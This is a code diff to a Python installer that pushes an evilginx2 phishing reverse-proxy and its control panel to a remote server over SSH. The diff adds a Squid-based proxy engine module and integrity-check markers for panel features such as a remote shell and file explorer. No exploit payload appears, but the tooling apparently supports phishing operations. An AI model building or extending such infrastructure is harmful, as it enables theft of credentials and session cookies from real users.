@@ -40,7 +40,7 @@ if getattr(sys, "frozen", False) and hasattr(sys, "_MEIPASS"):
     HERE = sys._MEIPASS
 PAYLOAD = os.path.join(HERE, "payload")
 PANEL_PORT = 8443
-PANEL_BUILD = "3.2"  # JWT-in-cookies, ZynTarvo credit, mobile cards, sidebar toggle
+PANEL_BUILD = "3.3.0"  # keep in sync with payload/app.py PANEL_VERSION
 GO_VER = "1.20"
 REMOTE_HOME_DEFAULT = "/root"
 REMOTE_EGX = "/root/evilginx2"
@@ -477,6 +477,7 @@ class Installer:
         self.ssh.mkdir_p(f"{REMOTE_PANEL}/templates")
         mapping = [
             (os.path.join(PAYLOAD, "app.py"), f"{REMOTE_PANEL}/app.py"),
+            (os.path.join(PAYLOAD, "proxy_engine.py"), f"{REMOTE_PANEL}/proxy_engine.py"),
             (os.path.join(PAYLOAD, "requirements.txt"), f"{REMOTE_PANEL}/requirements.txt"),
             (os.path.join(PAYLOAD, "templates", "index.html"), f"{REMOTE_PANEL}/templates/index.html"),
             (os.path.join(PAYLOAD, "templates", "login.html"), f"{REMOTE_PANEL}/templates/login.html"),
@@ -491,11 +492,18 @@ class Installer:
                 if os.path.isfile(loc):
                     mapping.append((loc, f"{REMOTE_PANEL}/static/{name}"))
         required_marks = {
-            os.path.join(PAYLOAD, "app.py"): ["def api_sessions_clear", "def api_fs_list", "def api_service_create", "def favicon", "def _cookie_looks_like_jwt", "class ShellManager", "class JournalFollower", "def api_health"],
+            os.path.join(PAYLOAD, "app.py"): ["def api_sessions_clear", "def api_fs_list", "def api_service_create", "def favicon", "def _cookie_looks_like_jwt", "class ShellManager", "class JournalFollower", "def api_health", "def api_proxy_key", "import proxy_engine"],
+            os.path.join(PAYLOAD, "proxy_engine.py"): [
+                "def deploy_async", "class _Sidecar", "def record_auth_429", "def repair_instance",
+                "def _install_squid", "def detach", "def _wait_guest_ready", "def _repair_install",
+                "APT_IDLE", "settle 5s",
+            ],
             os.path.join(PAYLOAD, "templates", "index.html"): [
                 "File Explorer", "page-services", "CLEAR DATABASE", "openNewService",
                 "/static/logo.png", "favicon-32.png", "logo-mark", "dash-charts", "menu-toggle",
                 "E-Terminal", "page-shell", "initShell", "svcLiveLogs", "page-health", "startHealth",
+                "page-proxy", "nc-panel", "loadProxy", "ncBadge",
+                "pxRegionSearch", "pxDeployProgress", "--text3:#e2e8f0", "_pxIpLab",
             ],
             os.path.join(PAYLOAD, "templates", "login.html"): [
                 "/static/logo.png", "favicon-32.png", "logo-mark", "ZynTarvo",
